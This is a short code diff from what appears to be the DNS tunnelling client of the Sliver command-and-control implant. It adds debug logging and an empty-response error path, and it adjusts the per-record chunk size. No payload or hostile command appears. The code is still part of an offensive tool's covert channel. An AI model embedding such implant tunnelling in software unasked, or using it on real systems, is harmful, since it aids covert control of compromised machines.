@@ -412,6 +412,11 @@ func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encode
 		}
 		if 0 < len(respData) {
 			resp = append(resp, respData...)
+		} else {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] no data received in response")
+			// {{end}}
+			return nil, ErrInvalidResponse
 		}
 	}
 	return resp, nil
@@ -476,6 +481,9 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	log.Printf("[dns] read msg resp data: %v", respData)
 	// {{end}}
 	if len(respData) < 1 {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] no data received in response")
+		// {{end}}
 		return nil, nil
 	}
 
@@ -555,7 +563,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 
 	var bytesPerTxt uint32
 	if s.noTXT {
-		bytesPerTxt = 192
+		bytesPerTxt = 128
 	} else {
 		bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
 	}
